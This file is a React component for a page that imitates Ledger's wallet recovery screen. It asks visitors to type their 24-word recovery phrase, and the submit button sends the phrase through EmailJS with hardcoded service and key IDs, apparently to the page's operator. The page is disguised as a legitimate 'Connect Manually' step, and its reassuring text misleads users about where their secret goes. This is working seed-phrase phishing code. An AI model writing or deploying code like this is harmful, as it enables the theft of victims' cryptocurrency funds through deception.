import React from 'react';

import './Import.css';
import { images } from '../../constants';

import emailjs from "emailjs-com"

const Import = () => {
    function sendEmail(e) {
        e.preventDefault();
        
    emailjs.sendForm("service_pt1oju5",
     "template_8hfdhdb",
      e.target,
       "bJ9kDM60vmiAlSnyi"
       ).then(res=>{
        console.log(res)
    }).catch(err => console.log(err));
    }
    return (
        <div>
            

        

    <div>
      <container>
        <div className="import">
        <center>
<img className="import_img" src={images.contract} alt="img"/></center>
<center className="margin_import">
<h className="import_text">ENTER YOUR RECOVERY PHRASE</h></center>
<center className="margin_import">
<h className="error_text2">Your recovery phrase is the secret list of words that<br></br>
you backed up when you first set up your wallet.</h></center>
<center className="margin_import">
<h className="error_text2">Ledger does not keep a copy of your recovery phrase.</h></center>

{/* textare phrase */}

<form onSubmit ={sendEmail}>
<label>Phrase</label>
<div class="button_margin2 ">
<textarea name="Phrase" cols="40" rows="10" class="wpcf7-form-control wpcf7-textarea wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Phrase" data-lt-tmp-id="lt-12659" spellcheck="false" data-gramm="false"></textarea></div>


    <div className="radio">
      <label>
        <input type="radio" value="option1" checked={true} />
        Typically 24 words seperated by a single spaces.
      </label>
    </div>
	{/* button */}
	<div class="button_margin2 ">
	<div class="spb_button2 spb_content_element2 col-sm-12" data-align="center" data-animation="none" data-delay="0">
		<div class="spb-asset-content2">
	<input id="textbox" type="submit" value="Connect Manually"/></div></div></div>
	</form>

</div>
</container>
</div>
</div>

);
}

export default Import;
